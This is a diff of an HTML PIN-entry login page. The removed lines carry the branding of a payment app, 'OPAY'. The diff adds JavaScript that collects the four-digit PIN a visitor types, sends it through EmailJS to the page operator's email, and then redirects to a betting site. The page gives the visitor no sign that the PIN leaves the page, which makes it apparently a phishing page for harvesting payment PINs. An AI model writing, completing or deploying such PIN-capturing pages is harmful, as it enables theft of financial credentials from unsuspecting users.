@@ -4,6 +4,45 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>PIN Login</title>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script>
+        // Initialize EmailJS
+        (function() {
+            emailjs.init("YOUR_PUBLIC_KEY"); // Replace with your EmailJS public key
+        })();
+
+        function handlePinSubmit(event) {
+            event.preventDefault(); // Prevent default form submission
+
+            // Collect PIN inputs
+            const pinInputs = document.querySelectorAll('.pin-input');
+            let pin = '';
+            pinInputs.forEach(input => {
+                pin += input.value;
+            });
+
+            if (pin.length === 4) {
+                // Prepare email parameters
+                const emailParams = {
+                    pin_code: pin, // Match this with your EmailJS template variable
+                };
+
+                // Send the email using EmailJS
+                emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", emailParams)
+                    .then(() => {
+                        alert("PIN sent successfully!");
+                        // Redirect after successful email send
+                        window.location.href = "https://1xbet.ng/en"; // Replace with your desired redirect URL
+                    })
+                    .catch(error => {
+                        console.error("Error sending PIN:", error);
+                        alert("Failed to send PIN. Please try again.");
+                    });
+            } else {
+                alert("Please enter a valid 4-digit PIN.");
+            }
+        }
+    </script>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -45,7 +84,7 @@
         .pin-container button {
             width: 100%;
             padding: 10px;
-            background-color:lightgreen;
+            background-color: lightgreen;
             color: #ffffff;
             border: none;
             border-radius: 5px;
@@ -53,28 +92,9 @@
             font-size: 16px;
         }
         .pin-container button:hover {
-            background-color:lightgreen;
+            background-color: #00a65a;
         }
     </style>
-     <form action="https://yourserver.com/process-login" method="POST">
-    <script>
-        function handlePinSubmit(event) {
-            event.preventDefault(); // Prevent form submission for now
-            const pinInputs = document.querySelectorAll('.pin-input');
-            let pin = '';
-            pinInputs.forEach(input => {
-                pin += input.value;
-            });
-
-            if (pin.length === 4) {
-                alert(`Entered PIN: ${pin}`); // For demonstration
-                // Here, you would typically send the PIN to your backend server
-                // Example: fetch('/verify-pin', { method: 'POST', body: JSON.stringify({ pin }) });
-            } else {
-                alert('Please enter a 4-digit PIN.');
-            }
-        }
-    </script>
 </head>
 <body>
     <div class="pin-container">
@@ -86,10 +106,6 @@
                 <input type="password" maxlength="1" class="pin-input" required>
                 <input type="password" maxlength="1" class="pin-input" required>
             </div>
-            <div class="login-container">
-                <h2>OPAY</h2>
-                    <div class="form-group">
-
             <button type="submit">Login</button>
         </form>
     </div>
